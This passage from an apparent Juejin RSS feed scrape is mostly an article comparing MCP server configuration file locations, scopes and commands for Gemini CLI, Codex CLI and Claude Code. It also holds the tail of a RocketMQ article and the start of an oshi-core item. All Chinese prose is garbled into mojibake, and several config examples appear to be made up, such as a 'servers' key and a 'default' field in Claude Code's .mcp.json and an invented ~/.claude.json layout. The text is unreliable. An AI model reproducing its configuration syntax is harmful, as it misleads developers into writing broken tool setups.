<p>é¡ºåºå†™çš„å¨åŠ›ï¼Œä¸æ˜¯å¿«ä¸€ç‚¹ï¼Œè€Œæ˜¯å¿«äº†å‡ ä¸ªæ•°é‡çº§ã€‚ä½†è¦è¾¾åˆ°è¿™ä¸ªå¨åŠ›ï¼Œéœ€è¦çš„ä¸åªæ˜¯é¡ºåºå†™ï¼Œè€Œæ˜¯æ•´å¥—ä¼˜åŒ–ç»„åˆæ‹³ã€‚</p>
<p>è¿™å°±æ˜¯CommitLogè®¾è®¡çš„ç²¾é«“ã€‚å®ƒä¸ä»…æ˜¯RocketMQçš„å­˜å‚¨åŸºçŸ³ï¼Œæ›´æ˜¯ä¸€ç§å¯ä»¥å¹¿æ³›åº”ç”¨çš„è®¾è®¡æ€æƒ³ã€‚</p>
<p>ä¸‹ä¸€ç¯‡ï¼Œæˆ‘ä»¬ä¼šæ·±å…¥ConsumeQueueçš„å¼‚æ­¥æ„å»ºæœºåˆ¶ï¼Œçœ‹çœ‹RocketMQå¦‚ä½•åœ¨ä¿è¯å†™å…¥æ€§èƒ½çš„åŒæ—¶ï¼Œè®©æ¶ˆè´¹è€…é«˜æ•ˆè¯»å–æ¶ˆæ¯ã€‚</p>
<hr/>
<p><strong>å‚è€ƒèµ„æ–™ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2F" target="_blank" title="https://rocketmq.apache.org/" ref="nofollow noopener noreferrer">RocketMQ å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Frocketmq%2Fblob%2Fmaster%2Fdocs%2Fcn%2Fdesign.md" target="_blank" title="https://github.com/apache/rocketmq/blob/master/docs/cn/design.md" ref="nofollow noopener noreferrer">RocketMQ Design</a></li>
<li>ã€ŠRocketMQæŠ€æœ¯å†…å¹•ã€‹ç¬¬ä¸‰ç«  - æ¶ˆæ¯å­˜å‚¨</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€å‘è€…å¿…çœ‹ï¼šä¸‰å¤§ CLI å·¥å…· MCP é…ç½®è¯¦è§£]]></title>    <link>https://juejin.cn/post/7590593682584502335</link>    <guid>https://juejin.cn/post/7590593682584502335</guid>    <pubDate>2026-01-02T06:35:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590593682584502335" data-draft-id="7589940210831196203" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€å‘è€…å¿…çœ‹ï¼šä¸‰å¤§ CLI å·¥å…· MCP é…ç½®è¯¦è§£"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-02T06:35:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«è½¦å¼ä½"/> <meta itemprop="url" content="https://juejin.cn/user/1345457960792808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€å‘è€…å¿…çœ‹ï¼šä¸‰å¤§ CLI å·¥å…· MCP é…ç½®è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457960792808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«è½¦å¼ä½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:35:54.000Z" title="Fri Jan 02 2026 06:35:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»¥ä¸‹æ˜¯ä¸‰å®¶ CLI å·¥å…·çš„ MCP é…ç½®æ ¸å¿ƒå·®å¼‚æ¦‚è¿°ï¼Œåç»­ç« èŠ‚å°†è¯¦ç»†ä»‹ç»æ¯ä¸ªå·¥å…·çš„å…·ä½“é…ç½®æ–¹å¼ï¼š</p>
<ul>
<li><strong>Gemini CLI</strong>ï¼šä½¿ç”¨ <code>.gemini/settings.json</code>ï¼ˆé¡¹ç›®çº§ï¼‰å’Œ <code>~/.gemini/settings.json</code>ï¼ˆç”¨æˆ·çº§ï¼‰ï¼Œé€šè¿‡ <code>mcpServers</code> ä¸ <code>mcp</code> ç»Ÿä¸€ç®¡ç†</li>
<li><strong>Codex CLI</strong>ï¼šä½¿ç”¨ <code>.codex/config.toml</code>ï¼ˆé¡¹ç›®çº§ï¼Œé€å±‚åŠ è½½ï¼‰å’Œ <code>~/.codex/config.toml</code>ï¼ˆç”¨æˆ·çº§ï¼‰</li>
<li><strong>Claude Code</strong>ï¼šä½¿ç”¨ <code>.mcp.json</code>ï¼ˆé¡¹ç›®çº§ï¼‰å’Œ <code>~/.claude.json</code>ï¼ˆç”¨æˆ·çº§ï¼‰ï¼Œæ”¯æŒ local/project/user ä¸‰ä¸ªä½œç”¨åŸŸ</li>
</ul>
<h2 data-id="heading-0">Gemini CLIï¼ˆgoogle/gemini-cliï¼‰</h2>
<h3 data-id="heading-1">é…ç½®ä½ç½®</h3>
<ul>
<li><strong>é¡¹ç›®çº§</strong>ï¼š<code>.gemini/settings.json</code></li>
<li><strong>ç”¨æˆ·çº§</strong>ï¼š<code>~/.gemini/settings.json</code></li>
</ul>
<h3 data-id="heading-2">å¸¸ç”¨å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash">gemini mcp add/list/remove <span class="hljs-comment"># é»˜è®¤ project ä½œç”¨åŸŸ</span>
gemini mcp add &lt;server&gt; -s/--scope user <span class="hljs-comment"># æŒ‡å®š user ä½œç”¨åŸŸ</span>
</code></pre>
<h3 data-id="heading-3">é…ç½®ç»“æ„ç¤ºä¾‹</h3>
<h3 data-id="heading-4">é¡¹ç›®çº§é…ç½®ï¼ˆ.gemini/settings.jsonï¼‰</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"team-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.example.com"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"headers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"Authorization"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Bearer {{TOKEN}}"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"*.example.com"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"exclude"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"node_modules/**"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-5">ç”¨æˆ·çº§é…ç½®ï¼ˆ~/.gemini/settings.jsonï¼‰</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"personal-server"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"stdio"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"mcp-server"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"--port"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"3000"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-6">ä½œç”¨åŸŸä¸ä¼˜å…ˆçº§</h3>
<ul>
<li>é€šè¿‡ <code>settings.json</code> çš„ <code>mcpServers</code> ä¸ <code>mcp</code> ç»Ÿä¸€ç®¡ç†</li>
<li><code>gemini mcp add</code> æ”¯æŒ <code>-s/--scope</code> å‚æ•°ï¼Œé»˜è®¤å€¼ä¸º <code>project</code></li>
<li>é¡¹ç›®çº§é…ç½®ä¼šè¦†ç›–ç”¨æˆ·çº§åŒåé…ç½®</li>
</ul>
<h2 data-id="heading-7">Codex CLIï¼ˆopenai/codexï¼‰</h2>
<h3 data-id="heading-8">é…ç½®ä½ç½®ä¸åŠ è½½å±‚çº§</h3>
<p>Codex ä½¿ç”¨ <code>config.toml</code> æ–‡ä»¶ï¼Œå¹¶æŒ‰ä»¥ä¸‹é¡ºåºå±‚å åŠ è½½ï¼ˆä¼˜å…ˆçº§ä»é«˜åˆ°ä½ï¼‰ï¼š</p>
<ol>
<li><strong>è¿è¡Œæ—¶é…ç½®</strong>ï¼šé€šè¿‡ <code>--config</code> ç­‰å‚æ•°ä¸´æ—¶è¦†ç›–</li>
<li><strong>é¡¹ç›®å±‚é…ç½®</strong>ï¼šä»å½“å‰ç›®å½•å‘ä¸ŠæŸ¥æ‰¾ <code>.codex/config.toml</code>ï¼Œè¶Šæ¥è¿‘å½“å‰ç›®å½•ä¼˜å…ˆçº§è¶Šé«˜</li>
<li><strong>ç”¨æˆ·å±‚é…ç½®</strong>ï¼š<code>$CODEX_HOME/config.toml</code>ï¼ˆé»˜è®¤ <code>~/.codex/config.toml</code>ï¼‰</li>
</ol>
<h3 data-id="heading-9">é¡¹ç›®æ ¹ç›®å½•è¯†åˆ«</h3>
<p>Codex ä¼šåŸºäº <strong>é¡¹ç›®æ ¹</strong> æ¥ç¡®å®šæœç´¢è¾¹ç•Œï¼Œé»˜è®¤ä»¥ <code>.git</code> ä½œä¸ºé¡¹ç›®æ ¹æ ‡è®°ã€‚å¯åœ¨é…ç½®ä¸­æ”¹å†™ <code>project_root_markers</code>ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-attr">project_root_markers</span> = [<span class="hljs-string">".git"</span>, <span class="hljs-string">".codex-root"</span>, <span class="hljs-string">"package.json"</span>]
</code></pre>
<h3 data-id="heading-10">å¸¸ç”¨å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸»è¦é€šè¿‡ç¼–è¾‘ config.toml æ–‡ä»¶</span>
<span class="hljs-comment"># OAuth ç™»å½•å‘½ä»¤</span>
codex mcp login &lt;name&gt;
</code></pre>
<h3 data-id="heading-11">é…ç½®ç»“æ„ç¤ºä¾‹</h3>
<h3 data-id="heading-12">é¡¹ç›®çº§é…ç½®ï¼ˆ.codex/config.tomlï¼‰</h3>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[mcp_servers.team-shared]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"npx"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-y"</span>, <span class="hljs-string">"mcp-server"</span>, <span class="hljs-string">"--env"</span>, <span class="hljs-string">"production"</span>]

<span class="hljs-section">[mcp_servers.http-server]</span>
<span class="hljs-attr">url</span> = <span class="hljs-string">"https://api.example.com/mcp"</span>
<span class="hljs-attr">bearer_token_env_var</span> = <span class="hljs-string">"MCP_TOKEN"</span>
</code></pre>
<h3 data-id="heading-13">ç”¨æˆ·çº§é…ç½®ï¼ˆ~/.codex/config.tomlï¼‰</h3>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[mcp_servers.personal-test]</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"python"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"-m"</span>, <span class="hljs-string">"mcp_server"</span>, <span class="hljs-string">"--debug"</span>]

<span class="hljs-comment"># å…¨å±€ MCP è®¾ç½®</span>
<span class="hljs-section">[mcp]</span>
<span class="hljs-attr">default_server</span> = <span class="hljs-string">"team-shared"</span>
</code></pre>
<h3 data-id="heading-14">ä½œç”¨åŸŸä¸ä¼˜å…ˆçº§</h3>
<ul>
<li>é…ç½®æŒ‰å±‚å é¡ºåºåŠ è½½ï¼Œè¶Šæ¥è¿‘å½“å‰ç›®å½•ä¼˜å…ˆçº§è¶Šé«˜</li>
<li>è¿è¡Œæ—¶é…ç½® &gt; é¡¹ç›®å±‚é…ç½® &gt; ç”¨æˆ·å±‚é…ç½®</li>
<li>é¡¹ç›®æ ¹ç›®å½•é»˜è®¤ä»¥ <code>.git</code> ä¸ºç•Œ</li>
</ul>
<h2 data-id="heading-15">Claude Codeï¼ˆclaude-codeï¼‰</h2>
<h3 data-id="heading-16">é…ç½®ä½ç½®</h3>
<ul>
<li><strong>é¡¹ç›®çº§</strong>ï¼š<code>.mcp.json</code>ï¼ˆå»ºè®®çº³å…¥ç‰ˆæœ¬æ§åˆ¶ï¼Œå›¢é˜Ÿå…±äº«ï¼‰</li>
<li><strong>ç”¨æˆ·çº§</strong>ï¼š<code>~/.claude.json</code>ï¼ˆè·¨é¡¹ç›®å…±äº«ï¼‰</li>
</ul>
<h3 data-id="heading-17">å¸¸ç”¨å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash">claude mcp add &lt;server&gt; --scope project <span class="hljs-comment"># é¡¹ç›®çº§é…ç½®</span>
claude mcp add &lt;server&gt; --scope user    <span class="hljs-comment"># ç”¨æˆ·çº§é…ç½®</span>
claude mcp list --scope all             <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰é…ç½®</span>
claude mcp remove &lt;server&gt; --scope <span class="hljs-built_in">local</span> <span class="hljs-comment"># ç§»é™¤æœ¬åœ°é…ç½®</span>
</code></pre>
<h3 data-id="heading-18">é…ç½®ç»“æ„ç¤ºä¾‹</h3>
<h3 data-id="heading-19">é¡¹ç›®çº§é…ç½®ï¼ˆ.mcp.jsonï¼‰</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"team-mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://mcp.team.example.com"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"headers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"X-Team"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"engineering"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"default"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"team-mcp"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-20">ç”¨æˆ·çº§é…ç½®ï¼ˆ~/.claude.jsonï¼‰</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcp"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"personal-local"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"stdio"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"mcp-server"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"--port"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"4000"</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"local"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"current-project-id"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"servers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"local-override"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://localhost:3000"</span>
          <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-21">ä½œç”¨åŸŸä¸ä¼˜å…ˆçº§</h3>
<ul>
<li><strong>ä¼˜å…ˆçº§é¡ºåº</strong>ï¼šlocal &gt; project &gt; user</li>
<li><strong>local ä½œç”¨åŸŸ</strong>ï¼šå­˜å‚¨åœ¨ <code>~/.claude.json</code> ä¸­ï¼Œä½†ä»…å¯¹å½“å‰é¡¹ç›®ç”Ÿæ•ˆ</li>
<li><strong>é¡¹ç›®çº§é…ç½®</strong>ï¼šé€šè¿‡ <code>.mcp.json</code> æ–‡ä»¶å…±äº«ï¼Œé€‚åˆå›¢é˜Ÿåä½œ</li>
<li><strong>ç”¨æˆ·çº§é…ç½®</strong>ï¼šè·¨é¡¹ç›®å…±äº«ï¼Œé€‚åˆä¸ªäººåå¥½è®¾ç½®</li>
</ul>
<h2 data-id="heading-22">é€‰æ‹©å»ºè®®ï¼ˆæŒ‰åœºæ™¯ï¼‰</h2>
<h3 data-id="heading-23">å›¢é˜Ÿåä½œåœºæ™¯</h3>
<ul>
<li><strong>ä¼˜å…ˆä½¿ç”¨é¡¹ç›®çº§é…ç½®</strong>ï¼šæŠŠ MCP æœåŠ¡å™¨ã€æƒé™ã€é»˜è®¤å‘½ä»¤å›ºå®šä¸‹æ¥</li>
<li>å°†é…ç½®æ–‡ä»¶çº³å…¥ç‰ˆæœ¬æ§åˆ¶ï¼Œç¡®ä¿å›¢é˜Ÿæˆå‘˜ä½¿ç”¨ä¸€è‡´çš„è®¾ç½®</li>
<li>é¿å…åœ¨é¡¹ç›®çº§é…ç½®ä¸­å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œå¯ä½¿ç”¨ç¯å¢ƒå˜é‡æ›¿ä»£</li>
</ul>
<h3 data-id="heading-24">ä¸ªäººä¹ æƒ¯åœºæ™¯</h3>
<ul>
<li><strong>ä½¿ç”¨ç”¨æˆ·çº§é…ç½®</strong>ï¼šæ‰¿è½½ä¸ªäººè·¯å¾„ã€å¯†é’¥ä¸å®éªŒæ€§é…ç½®</li>
<li>é€‚åˆä¸åŒé¡¹ç›®éœ€è¦çš„ä¸ªæ€§åŒ–è®¾ç½®</li>
</ul>
<h3 data-id="heading-25">é…ç½®è¦†ç›–åœºæ™¯</h3>
<ul>
<li><strong>ä½¿ç”¨ local ä½œç”¨åŸŸ</strong>ï¼šåœ¨ä¸ä¿®æ”¹å›¢é˜Ÿé…ç½®çš„æƒ…å†µä¸‹ï¼Œé’ˆå¯¹ç‰¹å®šé¡¹ç›®è¿›è¡Œæœ€å°åŒ–è¦†ç›–</li>
<li>é€‚åˆä¸´æ—¶æµ‹è¯•æˆ–æœ¬åœ°å¼€å‘éœ€æ±‚</li>
</ul>
<h2 data-id="heading-26">å‚è€ƒé“¾æ¥</h2>
<ul>
<li>Gemini CLI MCP æ–‡æ¡£ï¼š<code>https://github.com/google-gemini/gemini-cli/blob/main/docs/tools/mcp-server.md</code></li>
<li>Codex é…ç½®æ–‡æ¡£ï¼š<code>https://raw.githubusercontent.com/openai/codex/main/docs/config.md</code></li>
<li>Codex é…ç½®åŠ è½½é€»è¾‘ï¼ˆé¡¹ç›®å±‚çº§ï¼‰ï¼š<code>https://raw.githubusercontent.com/openai/codex/main/codex-rs/core/src/config_loader/mod.rs</code></li>
<li>Claude Code MCP æ–‡æ¡£ï¼š<code>https://code.claude.com/docs/en/mcp</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[com.github.oshi : oshi-core ä¸­æ–‡æ–‡æ¡£ï¼ˆä¸­è‹±å¯¹ç…§Â·APIÂ·æ¥å£Â·æ“ä½œæ‰‹å†ŒÂ·å…¨ç‰ˆæœ¬ï¼‰ä»¥6.4.0ä¸ºä¾‹ï¼Œå«Mavenä¾èµ–ã€jaråŒ…ã€æºç ]]></title>    <link>https://juejin.cn/post/7590104561475174452</link>    <guid>https://juejin.cn/post/7590104561475174452</guid>    <pubDate>2026-01-02T06:16:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561475174452" data-draft-id="7590054976489291816" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="com.github.oshi : oshi-core ä¸­æ–‡æ–‡æ¡£ï¼ˆä¸­è‹±å¯¹ç…§Â·APIÂ·æ¥å£Â·æ“ä½œæ‰‹å†ŒÂ·å…¨ç‰ˆæœ¬ï¼‰ä»¥6.4.0ä¸ºä¾‹ï¼Œå«Mavenä¾èµ–ã€jaråŒ…ã€æºç "/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-02T06:16:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¯’æ°´é¦¨"/> <meta itemprop="url" content="https://juejin.cn/user/2840793777967512"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
